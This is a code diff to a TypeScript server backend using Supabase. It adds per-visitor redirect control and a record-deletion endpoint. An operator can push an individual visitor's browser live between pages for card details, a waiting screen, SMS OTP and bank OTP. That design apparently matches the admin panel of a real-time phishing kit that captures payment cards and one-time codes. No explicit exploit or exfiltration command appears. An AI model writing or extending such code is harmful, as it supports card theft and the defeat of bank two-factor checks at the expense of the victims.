@@ -54,7 +54,34 @@ const devicePresence = new Map<string, PresenceEntry>();
 const userPresence = new Map<string, { lastSeen: number; currentPage: string }>();
 const lastKnownUserPage = new Map<string, string>();
 const userMetaMap = new Map<string, VisitorMeta>();
+const pendingRedirects = new Map<string, string>();
 let totalVisitorsCounter = 0;
+
+function normalizeRedirectTarget(action?: string | null): string | null {
+  if (!action) return null;
+  const trimmed = String(action).trim();
+  if (!trimmed) return null;
+  const map: Record<string, string> = {
+    '/': '/',
+    home: '/',
+    '/request': '/request',
+    form: '/request',
+    '/register-company': '/register-company',
+    company: '/register-company',
+    '/payment': '/payment',
+    payment: '/payment',
+    '/card-details': '/card-details',
+    card: '/card-details',
+    '/waiting': '/waiting',
+    waiting: '/waiting',
+    '/otp': '/otp',
+    otp: '/otp',
+    'otp-sms': '/otp',
+    '/otp-bank': '/otp-bank',
+    'otp-bank': '/otp-bank'
+  };
+  return map[trimmed] || (trimmed.startsWith('/') ? trimmed : null);
+}
 
 function getSupabase(env: Env): SupabaseClient | null {
   const supabaseUrl = env.SUPABASE_URL || '';
@@ -257,17 +284,35 @@ export default {
           });
 
           if (requestId) {
-            userPresence.set(String(requestId), {
+            const reqIdStr = String(requestId);
+            userPresence.set(reqIdStr, {
               lastSeen: now,
               currentPage
             });
-            lastKnownUserPage.set(String(requestId), currentPage);
-            userMetaMap.set(String(requestId), meta);
+            lastKnownUserPage.set(reqIdStr, currentPage);
+            userMetaMap.set(reqIdStr, meta);
+
+            const targetRoute = pendingRedirects.get(reqIdStr);
+            if (targetRoute) {
+              if (currentPage === targetRoute) {
+                pendingRedirects.delete(reqIdStr);
+                const supabase = getSupabase(env);
+                if (supabase) {
+                  await supabase
+                    .from('requests')
+                    .update({ next_action: '', updated_at: new Date().toISOString() })
+                    .eq('id', reqIdStr);
+                }
+              } else {
+                prunePresence();
+                return jsonResponse({ ok: true, requestId: reqIdStr, redirectTo: targetRoute }, 200, headers);
+              }
+            }
           }
         }
 
         prunePresence();
-        return jsonResponse({ ok: true, requestId }, 200, headers);
+        return jsonResponse({ ok: true, requestId, redirectTo: null }, 200, headers);
       }
 
       // 2. GET /api/stats
@@ -502,6 +547,22 @@ export default {
           });
           delete patchRow.id;
 
+          if (body?.nextAction !== undefined) {
+            const targetRoute = normalizeRedirectTarget(body.nextAction);
+            if (targetRoute) {
+              pendingRedirects.set(id, targetRoute);
+              lastKnownUserPage.set(id, targetRoute);
+              const existingPresence = userPresence.get(id);
+              if (existingPresence) {
+                userPresence.set(id, { ...existingPresence, currentPage: targetRoute });
+              }
+            } else {
+              pendingRedirects.delete(id);
+            }
+          } else if (body?.step === 'card' || body?.step === 'otp' || body?.step === 'otp-bank') {
+            pendingRedirects.delete(id);
+          }
+
           const { data, error } = await supabase
             .from('requests')
             .update(patchRow)
@@ -513,6 +574,18 @@ export default {
             return jsonResponse({ error: error.message }, 500);
           }
           return jsonResponse(fromSupabaseRow(data));
+        }
+
+        if (method === 'DELETE') {
+          const { error } = await supabase.from('requests').delete().eq('id', id);
+          if (error) {
+            return jsonResponse({ error: error.message }, 500);
+          }
+          userPresence.delete(id);
+          lastKnownUserPage.delete(id);
+          userMetaMap.delete(id);
+          pendingRedirects.delete(id);
+          return jsonResponse({ ok: true, id });
         }
       }
 
